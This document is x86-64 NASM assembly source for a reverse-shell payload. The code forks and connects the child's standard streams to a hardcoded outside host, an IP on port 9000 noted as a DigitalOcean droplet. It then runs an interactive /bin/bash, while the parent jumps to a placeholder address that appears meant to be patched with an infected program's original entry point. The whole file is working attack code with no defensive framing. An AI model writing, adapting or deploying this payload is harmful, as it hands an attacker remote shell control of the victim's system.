[bits 64]

%ifndef IPADDR
    %define IPADDR 0xB7_D0_D1_86 ; 134.209.208.183 (digital ocean droplet)
%endif
%ifndef PORT
    %define PORT 0x2823 ; 9000
%endif

global _start

_start:
    mov rax, 57 ; sys_fork
    syscall

    ; jump if parent
    test rax, rax
    jnz original

    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 41 ; sys_socket
    mov rdi, 2 ; AF_INET = 2 for IPv4
    mov rsi, 1 ; SOCK_STREAM = 1
    xor rdx, rdx ; 0 = TCP for SOCK_STREAM
    syscall

    ; dup2(socketfd, stdin)
    mov rdi, rax ; socketfd is stored in rax
    xor rsi, rsi ; stdin = 0
    mov rax, 33
    syscall

    ; dup2(socketfd, stdout)
    inc rsi ; stdout = 1
    mov rax, 33
    syscall

    ; dup2(socketfd, stderr)
    inc rsi ; stderr = 2
    mov rax, 33
    syscall

    ; connect(socketfd, sockaddr_in, socklen)
    ; sockaddr_in = { sin_family = AF_INET, port = 9000, sin_addr = 134.209.208.183, sin_zero = 8 bytes of 0 }
    ; ip above is digital ocean box
    mov rax, 42 ; sys_connect = 42
    sub rsp, 16 ; reserve 16 bytes for sockaddr_in
    mov word [rsp], 2 ; 2 bytes for AF_INET
    ; the hex below is written in little endian for 0x86 hex which is read as big endian
    mov word [rsp+2], PORT ; 2 bytes for port
    mov dword [rsp+4], IPADDR ; 4 bytes for ip addr
    ; 8 bytes after is padding
    mov rsi, rsp ; sockaddr_in = stack
    mov rdx, 16 ; socklen = 16
    syscall

    ; execve("/bin/bash", ["/bin/bash", "-i", null], null)
    xor rax, rax
    push rax ; argv[2] = null
    lea rax, [rel flag] 
    push rax ; argv[1] = "-i"
    lea rdi, [rel path]
    push rdi ; argv[0] = "/bin/bash"
    mov rsi, rsp
    xor rdx, rdx
    mov rax, 59 ; sys_execve = 59
    syscall

    ; if execve failed exit
    mov rax, 60
    xor rdi, rdi
    syscall
 
original:
    mov rax, 0xDEADBEEFDEADBEEF
    jmp rax

path:
    db "/bin/bash", 0

flag:
    db "-i", 0

